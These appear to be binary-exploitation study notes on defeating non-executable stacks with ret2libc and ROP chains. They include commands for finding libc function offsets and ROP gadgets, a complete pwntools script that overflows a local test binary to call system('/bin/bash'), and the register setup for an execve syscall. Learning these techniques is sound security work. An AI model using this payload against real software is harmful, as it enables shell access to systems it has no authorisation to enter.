# No eXecute / Data Execution Prevention

## ret2libc

Check if the target binary is using `libc` with the following commands:  
`ldd <binary>`  
or  
`vmmap` - when inside gdb  

List functions provided by your systems libc:  
`nm -D /lib/$(uname -m)-linux-gnu/libc-*.so | grep -vw U | grep -v "_" | cut -d " " -f 3`  

libc, or any other library, is a list of functions that reside at a known offset from the library base.  
If you know the library base and the library version, you will also know the target function's address.  

*NX prevents execution from the stack but having arguments there is fine*  

Steps to exec a function in libc:  
1. find interesting function to spawn a shell (System, Exec* (execl, execle, execlp, execve, execve, etc...))
2. Set up the stack
3. Overwrite EIP/RIP with the functions address

Stack setup:  
1. Offset to EIP
2. Address of the target function
3. Return address to be restored after executing the function, i.e. exit() (or anything if we don't care about a graceful exit)
4. Arguments for the target function

### System() Example
No ASLR  
---

From the man pages:  
`int system(const char *cmd);`  

Find system()'s offset from the libc base  
`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"`  
The address provided in the second column is the offset  
Open gdb while debugging the target binary and run: `vmmap libc`. Choose one which has "x" permissions  
Add the system() offset and the executable libc base to find system()'s address.  

If the above does not work, an alternative is `p system` in gdb.  
*repeat for exit() if looking to exit gracefully*  

System() requires a pointer to the string as an argument, not the string itself. Need to find "/bin/bash" or similar in the binary.  
In gdb: `search /bin` to find instances of shells  
Try to use addresses from libc  

**Example exploit:**  

```python3
#!/usr/bin/env python3
from pwn import *
io = process("./vuln")
offset = b"A" * 520
target_func = p64(0x7ffff7e17330)   # system @ 0x7ffff7e17330
ret_addr = p64(0x7ffff7e09590)    # exit @ 0x7ffff7e09590
sys_arg = p64(0x7ffff7f61031)   # Argument to system() "/bin/bash" @ 0x7ffff7f61031

payload = offset + target_func + ret_addr + sys_arg
print(payload)

io.sendline(payload)
io.interactive()
```

If you need to pass as a command line arg you can use `(cat payload.txt; cat) | ./vuln`  

## ROP Chains

Pwntools ROP documentation: <https://docs.pwntools.com/en/latest/rop/rop.html>  
<https://github.com/Gallopsled/pwntools-tutorial/blob/master/rop.md>  
Stephen Sims - Return Oriented Shellcode (SANS SEC760 Content)  
<https://www.youtube.com/watch?v=7BMyVvYv5d0>  
Automate finding gadgets <https://github.com/packz/ropeme>  

Overflow a buffer to control the EIP/RIP.  
From the EIP/RIP onwards, place the address of the instructions you are using and any values that need to be popped into registers, followed by an `int 0x80` toswitch to kernel mode and execute the system call.  

You can view the available gadgets in a program with `ropper`  
E.g. `ropper -f vuln` to view all of the gadgets in a binary.  


**Calling execve():**  
- AL register needs to hold 0x0b
- BX register needs to hold a pointer to your arg for the system call
- CX register points to the arg vector ARGV pointer array
- DX register points to the ENVP array (Environment Variable Pointer)

If the program has an mmap() function, you need to find rop gadgets **after** the mmap() has occurred to ensure the gadgets do exist in memory.  
- You can then use `ltrace` to view the address where mmap is mapped and add instuction offsets
- Validate by hitting a breakpoint in gdb and addid the 2 values, then `x/i $addr`





